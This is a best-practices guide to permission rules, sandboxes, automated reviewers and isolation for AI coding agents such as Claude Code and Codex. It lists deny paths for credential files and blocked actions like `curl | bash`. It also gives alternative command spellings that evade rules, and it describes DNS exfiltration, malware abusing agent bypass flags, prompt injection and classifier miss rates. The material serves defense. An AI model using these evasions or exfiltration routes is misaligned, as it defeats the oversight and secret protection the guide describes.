# Permissions and sandbox: best practices

How to design allow, ask and deny rules, configure the OS sandbox, reduce approval prompts without losing control, and decide when bypass modes are acceptable. Claude Code (CC) and Codex are equal leads; OpenCode (OC) appears where the research covers it. Terms follow the generalized model in [Permissions and sandbox](../concepts/permissions-and-sandbox.md): rule, decision, approval preset, automated reviewer, sandbox policy, writable root, read denial, network allowlist, escalation. Where each setting lives (user, project, policy) is on [Configuration](configuration.md).

Research date: 2026-10-04 (CC around v2.1.28x, Codex after 0.134). Items marked "(2025)" are older. Evidence labels: **[Vendor]** vendor documentation, **[Empirical]** measured data, **[Advisory]** CVE, security advisory or incident report, **[Practitioner]** practitioner or researcher opinion. "Inference" marks a conclusion the research draws without a direct source.

## Summary

1. [Deny secrets and destructive actions, ask for externally visible ones, allow only exact routine commands](#1-deny-secrets-and-destructive-actions-ask-for-externally-visible-ones-allow-only-exact-routine-commands).
2. [Treat command rules as guidance and enforce with the sandbox](#3-treat-command-rules-as-guidance-and-enforce-with-the-sandbox); alternative spellings bypass them in both leads.
3. [Protect secret paths in both the rule layer and the sandbox](#4-protect-secret-paths-in-both-the-rule-layer-and-the-sandbox); default sandbox reads include `~/.ssh` and `~/.aws`.
4. [Enable filesystem and network isolation together](#5-enable-filesystem-and-network-isolation-together); one without the other leaves an escape path.
5. [Make the sandbox fail closed and close the escape hatch](#6-make-the-sandbox-fail-closed-and-close-the-escape-hatch).
6. [Keep network allowlists narrow](#8-keep-network-allowlists-narrow); broad domains such as `github.com` are exfiltration channels.
7. [Reduce prompts with the sandbox or a reviewer, not with broad allow rules](#10-reduce-prompts-with-the-sandbox-or-a-reviewer-not-with-broad-allow-rules); users approve 93% of prompts.
8. [Run bypass modes only inside outer isolation](#12-run-bypass-modes-only-inside-outer-isolation), and lock bypass in policy.

## When to use it

Related best-practice pages: [configuration](configuration.md), [hooks](hooks.md), [instructions](instructions.md), [skills](skills.md), [subagents](subagents.md), [MCP](mcp.md), [plugins](plugins.md), [automation](automation.md).

Permissions decide whether a tool call runs. The sandbox limits what a running command can touch. Neither is the right place for everything.

| Need | Right tool | Why |
| --- | --- | --- |
| "Never do this" for a capability (read a secret path, reach a host) | Sandbox read denial or network allowlist, plus a deny rule | The sandbox holds whatever command text the model produces; rules alone do not ([CC permissions](https://code.claude.com/docs/en/permissions)) |
| "A human must see this first" (`git push`, deploy, publish) | Content-scoped ask rule | In CC, ask rules survive sandbox auto-allow and auto mode (inference from [CC sandboxing](https://code.claude.com/docs/en/sandboxing) and [CC permission modes](https://code.claude.com/docs/en/permission-modes)) |
| Routine project commands without prompts | Exact allow rules, or sandbox auto-allow | Narrow rules survive auto mode; broad ones are dropped |
| Inspect arguments, repository state or context before a call | `PreToolUse` [hook](hooks.md) | Rules cannot express it; hooks are steering, not a boundary ([Hooks concept](../concepts/hooks.md)) |
| Fewer prompts for actions the rules do not cover | Automated reviewer (CC auto mode, Codex auto-review) | Per-action control with measured miss rates; use on top of a sandbox |
| Contain MCP servers, hooks and file tools, or run unattended | Outer isolation: sandbox runtime, dev container, VM, cloud session | The per-command sandbox confines shell commands only |
| Conventions the model should follow | [Instructions](../concepts/instructions.md) | Advisory; "can be forgotten or overridden by context pressure" ([trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config)) |
| Authoritative merge gate | CI, see [Automation](../concepts/automation.md) | Independent of any agent configuration |
| Which MCP servers may run | MCP allowlists, see [MCP](../concepts/mcp.md) | MCP servers run outside the command sandbox in both leads |

## Approaches

### Rule lists

**What it is.** Patterns per tool or command prefix, each mapped to allow, ask or deny.

**When it fits.** Always, as the first filter. Rules are cheap and visible, and they steer the common case.

**How.**

- CC: `permissions.allow`, `ask`, `deny` in settings files, for any tool (`Bash(...)`, `Read(...)`, `Edit(...)`, `WebFetch(domain:...)`, `mcp__...`). Evaluation is deny, then ask, then allow, first match; a deny in any scope beats an allow in any scope. Managed rules cannot be overridden by CLI flags. "Yes, and don't ask again" for Bash saves a permanent per-repository rule; file-edit approvals last until session end ([CC permissions](https://code.claude.com/docs/en/permissions)).
- Codex: Starlark `prefix_rule(pattern, decision, justification, match, not_match)` in `rules/*.rules` next to each config layer; project rules only if the project is trusted. The most restrictive matching decision wins: `forbidden` > `prompt` > `allow`. Linear scripts joined with `&&`, `||`, `;`, `|` are split; scripts with redirections, substitutions, variables, wildcards or control flow are evaluated as one invocation `["bash","-lc","<script>"]`. Rules are experimental ([Codex rules](https://learn.chatgpt.com/codex/rules)). An `allow` rule runs the command outside the sandbox ([Permissions concept](../concepts/permissions-and-sandbox.md)).
- OpenCode: `permission` key per tool. The last matching rule wins, so put `"*"` first. Most permissions default to `allow`; `external_directory` and `doom_loop` default to `ask`; `.env` reads are blocked by default except `.env.example` ([OpenCode permissions](https://opencode.ai/docs/permissions/)).

**Trade-offs.** Command-pattern rules match the text the model usually produces, not the program. They are guidance, not a boundary ([practice 3](#3-treat-command-rules-as-guidance-and-enforce-with-the-sandbox)).

### Per-command OS sandbox

**What it is.** An OS boundary (Seatbelt on macOS, bubblewrap on Linux) applied to shell commands the agent starts: writable roots, read denials, network proxy.

**When it fits.** Every local session. It is the enforcement layer behind the rules.

**How.**

- CC: off by default; enable with `sandbox.enabled` or `/sandbox`. Writes are allowed to the cwd, per-user temp and added directories. Reads are allowed to "Most of the machine, including credential files such as `~/.ssh` and `~/.aws/credentials`". Environment variables are inherited "including any secrets". It confines Bash, PowerShell, Monitor and their children; Read, Edit, WebFetch, MCP servers and hooks run outside it. Network goes through a proxy whose allowed domains start empty. Native Windows is unsandboxed; use WSL2 ([CC sandboxing](https://code.claude.com/docs/en/sandboxing)).
- Codex: always on, through `sandbox_mode` (`read-only`, `workspace-write`, `danger-full-access`) or permission profiles (beta). `workspace-write` is the default for the desktop app, CLI and IDE extension. Network requires approval by default; `network_access = true` gives unrestricted access; the experimental proxy filters domains with `features.network_proxy.domains = { "api.openai.com" = "allow" }`. `sandbox_workspace_write.writable_roots` extends write scope. Linux needs `bubblewrap` (Ubuntu 24.04+ may need an AppArmor profile for unprivileged user namespaces); native Windows has its own sandbox ([Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing), [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)).
- OpenCode: no OS sandbox is documented. Isolation must be external ([OpenCode permissions](https://opencode.ai/docs/permissions/)).

**Prompt behavior inside the sandbox.** CC auto-allow mode runs sandboxed commands without prompts; explicit deny rules, content-scoped ask rules (for example `Bash(git push *)`) and critical-path `rm` still apply, and a bare `Bash` ask rule is skipped for sandboxed commands outside plan mode. Codex `on-request` "approves actions allowed by sandbox automatically; requires approval for escalations"; `granular` selects which categories prompt ([CC sandboxing](https://code.claude.com/docs/en/sandboxing), [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)).

**Trade-offs.** Defaults differ: CC is unsandboxed until enabled, Codex always applies a mode. The same task can need approvals in Codex and none in CC. The sandbox does not cover MCP servers or hooks in either lead.

### Automated reviewer

**What it is.** A model answers approval prompts in place of the user, using a policy text.

**When it fits.** Hands-off work where rules and the sandbox leave too many prompts. Not as the only control for unattended or high-stakes runs.

**How.**

- CC auto mode, the default starting mode in the terminal and VS Code since v2.1.283. Rules resolve first; reads and working-directory edits auto-approve; everything else goes to a classifier. On entering auto mode, broad allow rules are dropped: `Bash(*)`, `PowerShell(*)`, wildcarded interpreters such as `Bash(python*)`, package-manager run commands, `Agent` and `Monitor` allow rules. Narrow rules like `Bash(npm test)` stay. Default blocks include `curl | bash`, sending sensitive data externally, production deploys and migrations, force push, `git reset --hard`, `terraform destroy`, IAM grants, merging unapproved PRs, disabling CI and printing live credentials. Only the working directory and remotes present at session start are trusted (remotes added mid-session are untrusted since v2.1.200). After 3 consecutive or 20 total blocks it falls back to prompting. The classifier sees user messages, tool calls and CLAUDE.md; tool results are stripped, and a separate server-side probe scans tool results for injection ([CC permission modes](https://code.claude.com/docs/en/permission-modes)).
- Codex auto-review: `approvals_reviewer = "auto_review"`. It reviews only escalations that would otherwise pause for a human, checks for exfiltration of private data or secrets and for credential probing, and fails closed. A circuit breaker trips after 3 consecutive denials or 10 within 50 reviews. Policy text comes from org `guardian_policy_config` in managed settings or user `[auto_review].policy` ([Codex auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review)).
- OpenCode: none.

**Trade-offs.** Measured miss rates are double-digit on overeager actions ([practice 11](#11-use-automated-reviewers-on-top-of-a-sandbox-not-instead-of-one)). Both vendors say the reviewer is not a deterministic guarantee.

### Outer isolation

**What it is.** A boundary around the whole harness process, so file tools, MCP servers and hooks are inside it too.

**When it fits.** Unattended runs, bypass modes, untrusted repositories.

**How.** CC's isolation ladder, weakest to strongest: sandboxed Bash tool (shell only) → sandbox runtime `@anthropic-ai/sandbox-runtime` (whole process, including file tools, MCP and hooks; beta) → dev container → custom container → VM ("evaluating untrusted code") → cloud session. Choose by goal: fewer prompts locally → Bash sandbox; unattended bypass or auto → dev container, container, VM or sandbox runtime; untrusted repository → dedicated VM or cloud session. Docker Sandboxes (a microVM with its own Docker daemon) is listed as a VM option ([CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments), [Docker Sandboxes](https://docs.docker.com/ai/sandboxes/)). The reference dev container uses a default-deny `init-firewall.sh` (needs `NET_ADMIN`/`NET_RAW`) and a non-root user ([CC devcontainer](https://code.claude.com/docs/en/devcontainer)). For Codex, the docs name Docker as acceptable outer isolation for `--yolo` ([Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)). The research found no Codex equivalent of the sandbox runtime, so Codex MCP servers and hooks need container or VM isolation or the MCP allowlist (inference).

**Trade-offs.** "Any approach that allows network egress can still leak data the agent can read, and any approach that mounts your project directory writable can still modify that code." Isolation "does not change what is sent to the model" ([CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)). A dev container in bypass mode "do[es] not prevent a malicious project from exfiltrating anything accessible inside the container, including the Claude Code credentials stored in `~/.claude`"; edits in the bind-mounted workspace appear on the host ([CC devcontainer](https://code.claude.com/docs/en/devcontainer)). Dev containers are a convention, not an enforcement boundary, unless device management or software allowlisting forces them.

### Unattended presets

**What it is.** Presets that never prompt, for CI and scripts.

**How.** CC `dontAsk` denies anything that would prompt; CC CI example: `-p --permission-mode dontAsk --allowedTools "Bash(npm test)" "Read"`. Codex CI: `--sandbox read-only --ask-for-approval never`. OpenCode `--auto` approves anything that would ask; explicit deny rules survive it ([CC permission modes](https://code.claude.com/docs/en/permission-modes), [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security), [Permissions concept](../concepts/permissions-and-sandbox.md)).

**Trade-offs.** CC `dontAsk` fails closed; OpenCode `--auto` fails open. What Codex `never` does with a request that would need approval is not stated in the fetched pages.

## Practices

### 1. Deny secrets and destructive actions, ask for externally visible ones, allow only exact routine commands

- **Why:** This is the minimal portable baseline. Deny is the tool for "never", ask for "a human must see this", allow for the project's own commands.
- **How:**
  - Deny reads of secret paths. Trail of Bits' user-level `Read`/`Edit` deny list: `~/.ssh/**`, `~/.gnupg/**`, `~/.aws/**`, `~/.azure/**`, `~/.kube/**`, `~/.docker/config.json`, `~/.npmrc`, `~/.npm/**`, `~/.pypirc`, `~/.gem/credentials`, `~/.git-credentials`, `~/.config/gh/**`, `~/Library/Keychains/**`, crypto-wallet app data; plus edits to `~/.bashrc` and `~/.zshrc`.
  - Ask on `git push`, publish, deploy and infrastructure commands.
  - Allow exact commands only: `npm test`, `make lint`.
  - Same intent per harness: CC `"ask": ["Bash(git push *)"]`; Codex `prefix_rule(pattern=["git","push"], decision="prompt")`; OpenCode `"bash": {"git push *": "ask"}` ([Permissions concept](../concepts/permissions-and-sandbox.md#portability)).
- **Evidence:** [Practitioner] [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config); [Vendor] [CC permissions](https://code.claude.com/docs/en/permissions); [Vendor] [Codex rules](https://learn.chatgpt.com/codex/rules). The baseline itself is inference from these.

### 2. Never allow interpreters, package-manager run commands, docker or shell wrappers broadly

- **Why:** Each executes arbitrary code. In CC, a matching allow rule such as `Bash(curl *)` also approves the unsandboxed retry of that command. CC auto mode drops exactly these broad rules (`Bash(*)`, `Bash(python*)`, package-manager run commands) when it starts.
- **How:** Remove `Bash(*)`, `Bash(python*)`, `npm run *`-style, `docker *` and `bash -c *` allow rules. Replace them with exact commands.
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] [CC permission modes](https://code.claude.com/docs/en/permission-modes).

### 3. Treat command rules as guidance and enforce with the sandbox

- **Why:** A CC Bash rule "covers the invocation Claude usually produces and isn't a security boundary around the program". `Bash(curl *)` does not stop `/usr/bin/curl ...` or `sh -c 'curl ...'`; `Bash(git push *)` does not stop `git -C . push`, `git -c push.default=current push` or `git 'push'`. Codex evaluates complex `sh -c` scripts as one invocation. "Read-only" allowlists can be exfiltration channels: CVE-2025-55284 (2025) auto-approved `ping`, `nslookup` and `dig`.
- **How:** Use rules to steer and the sandbox to enforce. Do not write argument-constraining patterns such as `Bash(curl http://github.com/ *)`; they miss options-first forms, `https`, redirects and variables. Instead deny `curl` and `wget`, use `WebFetch(domain:...)`, and pair it with the sandbox network allowlist, or use a `PreToolUse` hook. WebFetch alone does not prevent network access: "If Bash is allowed, Claude can still use `curl`".
- **Evidence:** [Vendor] [CC permissions](https://code.claude.com/docs/en/permissions); [Vendor] [Codex rules](https://learn.chatgpt.com/codex/rules); [Advisory] (2025) [GitLab CVE-2025-55284](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/); [Practitioner] Trail of Bits calls hooks "guardrails, not walls" ([trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config)).

### 4. Protect secret paths in both the rule layer and the sandbox

- **Why:** In CC, permission `Read(...)` denies govern the Read tool, while `sandbox.filesystem.denyRead` governs shell commands. "A `denyRead` entry doesn't stop the Read tool, and `allowedDomains` doesn't limit WebFetch." Default sandbox reads include `~/.ssh` and `~/.aws/credentials`.
- **How:**
  - CC: set both the `Read(...)` deny and `sandbox.filesystem.denyRead`. For a lockdown, `"denyRead": ["~/"]` with `allowRead` for the project (the narrower path wins), or `permissions.blockReadsOutsideWorkingDirectories`.
  - Codex: permission profile `filesystem."<path>" = "deny"` (beta; profiles are used instead of `sandbox_mode`, not together with it), or admin `[permissions.filesystem]` deny-read globs in `requirements.toml`.
  - OpenCode: `read` deny patterns; `.env` is denied by default.
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration); [Vendor] [OpenCode permissions](https://opencode.ai/docs/permissions/).

### 5. Enable filesystem and network isolation together

- **Why:** "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys. Without filesystem isolation ... a compromised agent could backdoor system resources to gain network access." With CC filesystem isolation off and auto-allow on, a sandboxed command can write shell startup files, executables on `$PATH` or `~/.claude/settings.json` and widen its own access on the next run.
- **How:** Keep both on. When adding an `allowWrite` path, a broad `allowedDomains` entry or an `excludedCommands` exception, check that it "does not undo a restriction on the other side".
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] (2025) [Anthropic engineering, sandboxing (Oct 20, 2025)](https://www.anthropic.com/engineering/claude-code-sandboxing).

### 6. Make the sandbox fail closed and close the escape hatch

- **Why:** If the CC sandbox cannot start, commands run unsandboxed by default. A command that fails in the sandbox may be retried with `dangerouslyDisableSandbox`; that retry prompts in Manual and acceptEdits, goes to the classifier in auto, is denied in dontAsk and runs without a prompt in bypass. A matching allow rule also approves it.
- **How:**
  - CC: `sandbox.failIfUnavailable: true`; either `allowUnsandboxedCommands: false` ("strict sandbox mode") or an ask rule `Bash(dangerouslyDisableSandbox:true)` to force a prompt. In managed settings: `{"sandbox": {"enabled": true, "failIfUnavailable": true, "allowUnsandboxedCommands": false}}`.
  - Codex: on Linux, install `bubblewrap`; Codex prints a startup warning if `bwrap` is missing. Escalation out of the sandbox goes through approval; restrict it with `allowed_sandbox_modes` and `allowed_approval_policies` in `requirements.toml`.
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] [Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing); [Vendor] [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration).

### 7. Prefer write paths over command exclusions, and review exclusions like sudo grants

- **Why:** "An excluded command runs with your full access." A pattern covering an interpreter, a workspace script, or a tool that reads a workspace file (for example `docker compose`) lets the agent write that file and run it outside the sandbox. `allowUnixSockets` for `/var/run/docker.sock` "effectively grants access to the host system". Writes to `$PATH` directories, system config directories or `.bashrc`/`.zshrc` enable privilege escalation.
- **How:** Use `sandbox.filesystem.allowWrite` for a specific path (for example `~/.kube`) instead of `excludedCommands`. Do not allow the Docker socket. Use `enableWeakerNestedSandbox` only when other isolation is enforced. Do not enable `allowAppleEvents` (it removes code-execution isolation on macOS). In Codex, extend `writable_roots` narrowly. The research infers that `excludedCommands` and `allowUnixSockets` are the most common ways to undo the sandbox quietly.
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] [Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing).

### 8. Keep network allowlists narrow

- **Why:** "Allowing broad domains such as `github.com` can create paths for data exfiltration." The CC proxy decides from the client-supplied hostname without inspecting TLS, so sandboxed code can use domain fronting.
- **How:**
  - Allow package registries and the hosts the build needs, not general-purpose hosts (inference).
  - CC: `strictAllowlist: true` (user, managed or `--settings` only, v2.1.219+) denies instead of prompting. "Yes, and don't ask again" saves a `WebFetch(domain:...)` rule to local settings; review those. Managed `allowManagedDomainsOnly` honors only managed domains. For stronger guarantees, use a custom proxy that terminates TLS and inspects traffic; once a custom `httpProxyPort` or `socksProxyPort` is set, CC's own domain controls no longer apply to that traffic.
  - Codex: `features.network_proxy.domains`; admin `[experimental_network] managed_allowed_domains_only = true`. Codex cloud: allow only necessary domains (or the "Common dependencies" preset) and restrict HTTP methods to `GET`, `HEAD`, `OPTIONS`; setup scripts keep internet access regardless.
  - Codex web search: keep the default `cached` mode, which "reduces injection exposure"; `--yolo` switches it to `live`. "Treat web results as untrusted".
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security); [Vendor] [Codex cloud internet access](https://learn.chatgpt.com/codex/cloud/internet-access); [Vendor] [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration).

### 9. Mask or strip credentials that sandboxed commands can reach

- **Why:** Sandboxed commands inherit environment variables and can read credential files unless told otherwise.
- **How:**
  - CC `sandbox.credentials`: `deny` blocks files and unsets environment variables for sandboxed commands; `mask` gives commands a sentinel that the proxy replaces with the real value only on requests to allowed hosts. Masking needs `network.tlsTerminate`; `claude doctor` warns when TLS termination is unavailable. Mask AWS key pairs together (SigV4 re-signing). An unmatched `extract` pattern defaults to `warn` and leaves the file readable unmasked; use `deny` if the secret may be present.
  - Codex: `[shell_environment_policy]` filters, with `ignore_default_excludes = false` set explicitly (see [Configuration practice 5](configuration.md#5-filter-secrets-from-subprocess-environments-explicitly)).
  - Cloud sessions (CC): the VM gets a short-lived scoped GitHub credential; a proxy attaches the real one and rejects branch deletions and tag pushes. Branch protection still decides what can be pushed.
- **Evidence:** [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Vendor] [CC security](https://code.claude.com/docs/en/security); [Vendor] [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced).

### 10. Reduce prompts with the sandbox or a reviewer, not with broad allow rules

- **Why:** "Claude Code users approve 93% of permission prompts". Sandboxing "safely reduces permission prompts by 84%" in Anthropic's internal usage (2025). Broad allow rules remove prompts but also remove control and, in CC, approve unsandboxed retries.
- **How:** CC: enable the sandbox with auto-allow (the "Manual + Bash sandbox auto-allow" setup runs "without a classifier"), keep content-scoped ask rules for push and deploy. Codex: `workspace-write` with `on-request`. For actions outside the sandbox, add an automated reviewer ([practice 11](#11-use-automated-reviewers-on-top-of-a-sandbox-not-instead-of-one)).
- **Evidence:** [Empirical] [Anthropic engineering, auto mode (Mar 25, 2026)](https://www.anthropic.com/engineering/claude-code-auto-mode); [Empirical] (2025) [Anthropic engineering, sandboxing (Oct 20, 2025)](https://www.anthropic.com/engineering/claude-code-sandboxing); [Vendor] [CC permission modes](https://code.claude.com/docs/en/permission-modes). Both figures are vendor-measured; no independent study was found.

### 11. Use automated reviewers on top of a sandbox, not instead of one

- **Why:** CC auto-mode classifier, measured by Anthropic: on real traffic (n=10,000) full-pipeline false-positive rate 0.4%; on real overeager actions (n=52) false-negative rate 17%; on synthetic exfiltration (n=1,000) FNR 5.7%. The authors: "It is not a drop-in replacement for careful human review on high-stakes infrastructure." CC: "The classifier is a per-action control, not an isolation boundary." Codex: auto-review "is not a deterministic security guarantee" and should "complement, not replace, good sandbox design, monitoring, and organization-specific policy". Adaptive attacks bypassed 12 published prompt-injection defenses with success "above 90% for most" (2025).
- **How:** Enable CC auto mode or Codex auto-review only with the sandbox on. For unattended runs, add outer isolation. Write a Codex `[auto_review].policy` (or org `guardian_policy_config`) that names your sensitive systems.
- **Disagreement:** Willison argues that 95% capture rates are "very much a failing grade" in security (2025).
- **Evidence:** [Empirical] [Anthropic engineering, auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode); [Vendor] [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments); [Vendor] [Codex auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review); [Empirical] (2025) "The Attacker Moves Second", summarized by [Simon Willison (Nov 2, 2025)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/); [Practitioner] (2025) [Willison, The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/).

### 12. Run bypass modes only inside outer isolation

- **Why:** CC `bypassPermissions` "offers no protection against prompt injection or unintended actions". The Bash sandbox alone "is not sufficient for fully unattended runs". Codex `--yolo`: "Use only in tightly controlled, trusted environments". The s1ngularity malware (Aug 26, 2025) used installed CLIs' bypass flags to search for secrets.
- **How:**
  - Run `--dangerously-skip-permissions` or `--yolo` only inside a container, VM or the sandbox runtime, so file tools, MCP servers and hooks are inside the boundary. CC refuses bypass as root or sudo on Linux and macOS (skipped inside a recognized sandbox) and under `--restricted` (v2.1.248+).
  - Inside the boundary: non-root user, default-deny egress firewall, no mounted host credentials, short-lived scoped tokens, budget-capped accounts. Use dev containers only with trusted repositories.
  - Lock bypass where it is not wanted: CC `permissions.disableBypassPermissionsMode: "disable"` (works from any scope, including your own user settings); Codex `allowed_sandbox_modes` and `allowed_approval_policies` in `requirements.toml`.
- **Disagreement:** The CC docs say "containers, VMs, or dev containers without internet access". Trail of Bits runs CC in bypass mode by default, with the sandbox, a dev container or a disposable remote droplet as the actual control: "the sandbox is what keeps it from doing damage". Willison (2025) prefers "someone else's computer" (for example GitHub Codespaces) and scoping credentials to staging with hard budget caps (example: a dedicated Fly.io organization with a $5 limit). Codex says Docker outer isolation is acceptable.
- **Evidence:** [Vendor] [CC permission modes](https://code.claude.com/docs/en/permission-modes); [Vendor] [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments); [Vendor] [CC devcontainer](https://code.claude.com/docs/en/devcontainer); [Vendor] [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security); [Practitioner] [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config), [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer); [Practitioner] (2025) [Willison, Designing agentic loops](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/); [Advisory] (2025) [Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack), [StepSecurity](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware).

### 13. Pick the isolation level by goal

- **Why:** Each level covers a different set of processes. Only the sandbox runtime among host-level options also confines CC's MCP servers and hooks.
- **How:** Use the [outer isolation](#outer-isolation) ladder: Bash sandbox for fewer local prompts; container, VM or sandbox runtime for unattended runs; dedicated VM or cloud session for untrusted repositories. CC also recommends: "Use virtual machines (VMs) to run scripts and make tool calls, especially when interacting with external web services". With the sandbox runtime, a clean start is not proof that settings loaded; on Linux its protected-path deny list is built once at launch, so add `denyWrite` for other config paths.
- **Evidence:** [Vendor] [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments); [Vendor] [CC security](https://code.claude.com/docs/en/security).

### 14. Cut a leg of the lethal trifecta instead of relying on detection

- **Why:** An agent with private data access, untrusted content and an outbound channel can be steered by injected text (2025). Meta's "Agents Rule of Two" (2025): within a session an agent should satisfy no more than two of untrustworthy input, access to sensitive systems or private data, and changing state or communicating externally; if all three are needed, require a human in the loop or a fresh context. Detection-based defenses fail against adaptive attackers.
- **How:** In a typical coding session all three legs are present by default. The practical lever is removing egress (narrow allowlist, ask on push) or removing secrets from reach, not detecting injection (inference). CC: "Avoid piping untrusted content directly to Claude"; WebFetch returns a model summary rather than the raw page.
- **Evidence:** [Practitioner] (2025) [Willison, The lethal trifecta (Jun 16, 2025)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/); [Practitioner] (2025) [Meta AI, Agents Rule of Two (Oct 31, 2025)](https://ai.meta.com/blog/practical-ai-agent-security/); [Vendor] [CC security](https://code.claude.com/docs/en/security).

### 15. Remove deprecated presets and review remembered approvals

- **Why:** Codex `approval_policy = "untrusted"` is deprecated: "remove from all configurations immediately"; it can stop the client from starting, and `on-failure` is deprecated too. Remembered approvals accumulate: CC "don't ask again" saves permanent per-repository Bash rules; the Codex TUI writes to `~/.codex/rules/default.rules`.
- **How:** Search configs for `untrusted` and `on-failure`. Periodically review CC `/permissions` and Codex `default.rules` for broad entries that slipped in (inference).
- **Evidence:** [Vendor] [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security); [Vendor] [CC permissions](https://code.claude.com/docs/en/permissions); [Vendor] via the [Permissions concept](../concepts/permissions-and-sandbox.md).

## Anti-patterns

| Avoid | Do instead |
| --- | --- |
| `Bash(*)`, `Bash(python*)`, `docker *`, `bash -c *` allow rules | Exact command allows; sandbox auto-allow ([practice 2](#2-never-allow-interpreters-package-manager-run-commands-docker-or-shell-wrappers-broadly)) |
| Argument-constraining patterns such as `Bash(curl http://github.com/ *)` | Deny `curl`/`wget`, use `WebFetch(domain:...)` plus the sandbox allowlist |
| A `Read(...)` deny alone in CC | Add `sandbox.filesystem.denyRead` or `sandbox.credentials` too |
| Treating "read-only" commands (`ping`, `dig`, `nslookup`) as safe | Remember CVE-2025-55284; keep network limits in the sandbox |
| Sandbox without `failIfUnavailable` | Fail closed |
| `excludedCommands` for interpreters, `docker compose`, or workspace scripts | `allowWrite` for a specific path |
| `allowUnixSockets` for `/var/run/docker.sock` | Do not expose the Docker socket |
| `github.com` or other broad domains in the allowlist | Narrow hosts; TLS-inspecting proxy if the threat model needs it |
| An automated reviewer as the only control for unattended runs | Reviewer plus sandbox plus outer isolation |
| `--dangerously-skip-permissions` or `--yolo` on the host | Container, VM or sandbox runtime with no host secrets and restricted egress |
| Dev container with `~/.ssh` or cloud credentials mounted | Short-lived tokens via `containerEnv`, Codespaces secrets or workload identity |
| Codex `approval_policy = "untrusted"` | `on-request` (optionally with auto-review) |
| OpenCode rules with `"*"` last | Put `"*"` first; the last match wins |
| Relying on OpenCode for isolation | Run it in a container or VM; it has no documented sandbox |

## Security

| Threat | Advisory or source | Mitigation |
| --- | --- | --- |
| Prompt injection steers the agent | (2025) [Lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/); (2025) [Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) | Cut egress or secrets ([practice 14](#14-cut-a-leg-of-the-lethal-trifecta-instead-of-relying-on-detection)) |
| Exfiltration through auto-approved "safe" commands | (2025) CVE-2025-55284: CC before 1.0.4 auto-approved `ping`, `nslookup`, `dig`; secrets could leave as DNS subdomains with no prompt. Fixed by removing them from the allowlist ([GitLab advisory](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/), [Embrace The Red](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)) | Network isolation in the sandbox; do not trust command allowlists for exfiltration |
| Model-chosen working directory widens the sandbox | (2025) CVE-2025-59532: Codex CLI 0.2.0 to 0.38.0 could treat a model-generated cwd as the writable root. Fixed in 0.39.0 (IDE extension 0.4.12) by canonicalizing the boundary to where the user started ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-59532), [GitLab advisory](https://advisories.gitlab.com/pkg/npm/@openai/codex/CVE-2025-59532/)) | Keep Codex updated |
| Malware invokes the agent CLI with bypass flags | (2025) s1ngularity/Nx npm compromise, Aug 26, 2025: a malicious postinstall ran local Claude, Gemini and Q CLIs with `--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools`, searched for secrets and wallets, and exfiltrated to public GitHub repositories in victims' accounts ([Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack), [StepSecurity](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware)) | `disableBypassPermissionsMode` (any scope); Codex `allowed_sandbox_modes`/`allowed_approval_policies` |
| Compromised agent extension | (2025) Amazon Q Developer VS Code extension 1.84.0 shipped a wipe prompt after an attacker used an "inappropriately scoped GitHub token in their CodeBuild configuration"; it failed due to a syntax error. Fixed in 1.85.0; CVE-2025-8217 ([AWS-2025-015](https://aws.amazon.com/security/security-bulletins/AWS-2025-015/)) | Least privilege for the agent; outer isolation for unattended runs |
